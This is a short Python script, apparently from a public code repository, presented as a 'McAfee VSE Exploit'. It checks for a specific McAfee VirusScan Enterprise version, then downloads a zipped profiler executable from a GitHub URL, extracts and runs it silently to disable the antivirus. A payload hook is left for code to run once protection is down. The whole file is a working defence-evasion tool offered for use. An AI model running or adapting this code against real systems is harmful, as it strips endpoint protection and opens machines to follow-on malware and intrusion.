import sys
import os
import urllib.request
import zipfile
import time

# Disables McAfee Virus Scan Enterprise by running McAfee Profiler in silent mode. Also
# check to see if the installed version is vulnerable, but that part is still in the works. It works,
# but can be imporved on further.

def checkVuln():
	chkcmd = r'"C:\Program Files\Common Files\McAfee\SystemCore\csscan.exe" -Versions'
	os.system(chkcmd + '> C:\mvout.txt')
	txtf = open("C:\mvout.txt", "r")
	line = txtf.read().split(' ')
	if str(line[13]) == "5800.7501\n\n":
		print(str(line[13]) + "Vulnerable!\nUse --exploit to disable McAfee VSE")
	else:
		print("This version is (probably) NOT vulnerable!")

def callPayload():
	#Call whatever you want to call immediately after VSE has been disabled here:
	print("You've been pwned!")

def exploit():
	if os.path.exists("C:\McAfeeProfiler\McProfiler.exe") == False:
                # I put Profiler on my GitHub because the one from McAfee is an MSI and that just adds more trouble than it's worth.
                # If you don't trust the exe on my GitHub, simply download the McAfee Profiler app from the McAfee website.
		urllib.request.urlretrieve ("https://github.com/AlanRaff/VSE-Exploit/blob/master/mvsep.zip?raw=true", "c:\mvsep.zip")
		zip = zipfile.ZipFile(r'C:\mvsep.zip')
		zip.extractall(r'C:\\')
	expcmd = "C:\McAfeeProfiler\McProfiler.exe /Silent"
	os.system(expcmd)
	time.sleep(3)
	callPayload()

def main():
	if len(sys.argv) == 1:
		print("NAME\n		McAfee VSE Exploit\n")
		print("DESCRIPTION\n		Exploits a vulnerability in McAfee Profiler that temporarily")
		print("		disables McAfee Virus Scan Enterprise.\n")
		print("OPTIONS\n")
		print("--check			Checks to see if the version of McAfee running is")
		print("			vulnerable")
		print("--exploit		Exploits the vulnerability in McAfee Profiler")
	elif str(sys.argv[1]) == "--check":
		checkVuln()
	elif str(sys.argv[1]) == "--exploit":
		exploit()

if __name__ == "__main__":
    main()
